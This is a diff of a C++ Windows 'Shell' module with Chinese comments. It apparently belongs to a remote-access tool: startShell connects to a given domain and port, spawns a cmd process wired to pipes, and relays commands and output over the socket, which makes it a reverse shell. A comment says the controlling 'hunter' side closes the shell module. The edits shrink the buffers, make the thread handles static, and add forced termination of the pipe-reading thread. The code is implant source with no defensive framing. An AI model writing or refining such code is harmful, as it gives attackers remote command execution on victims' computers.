@@ -1,8 +1,8 @@
 #include "pch.h"
 #include "Shell.h"
 
-#define SEND_SIZE   1024
-#define RESULT_SIZE 4096
+#define SEND_SIZE   128
+#define RESULT_SIZE 256
 
 static Shell gShell; // 初始化类
 static TcpSocket gSock;
@@ -10,7 +10,8 @@ static TcpSocket gSock;
 static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
 // 创建命令行进程之后拿到的pi 控制cmd进程
 static PROCESS_INFORMATION gPi = { 0 };
-// 准备缓存
+// 线程句柄
+static HANDLE hReadSock, hReadPipe;
 // 准备缓存
 static CHAR szSend[SEND_SIZE] = { 0 };
 static CHAR szResult[RESULT_SIZE] = { 0 };
@@ -32,8 +33,8 @@ void Shell::startShell(std::string domain, int port) {
 	}
 
 	// 创建负责输入命令的线程
-	HANDLE hReadSock = CreateThread(NULL, 0, Shell::threadReadSock, (LPVOID)NULL, 0, NULL);
-	HANDLE hReadPipe = CreateThread(NULL, 0, Shell::threadReadPipe, (LPVOID)NULL, 0, NULL);
+	hReadSock = CreateThread(NULL, 0, Shell::threadReadSock, (LPVOID)NULL, 0, NULL);
+	hReadPipe = CreateThread(NULL, 0, Shell::threadReadPipe, (LPVOID)NULL, 0, NULL);
 	if ((!hReadSock) || (!hReadPipe)) {
 		OutputDebugStringA("Failed to create new thread read socket\r\n");
 		CloseHandle(ghReadPipe1);
@@ -113,6 +114,11 @@ DWORD Shell::threadReadSock(LPVOID args) {
 	CloseHandle(ghWritePipe2);
 	TerminateProcess(gPi.hProcess, 0);
 	gSock.dissconnect();
+	// 一般来说 如果hunter主动关闭了shell模块
+	// 都是这一个线程发现问题主动退出 而readpipe线程
+	// 很有可能还阻塞在读取管道而无数据的过程中 无法主动退出
+	// 所以这个强行关闭它
+	TerminateThread(hReadPipe, 0);
 	return 1;
 }
 
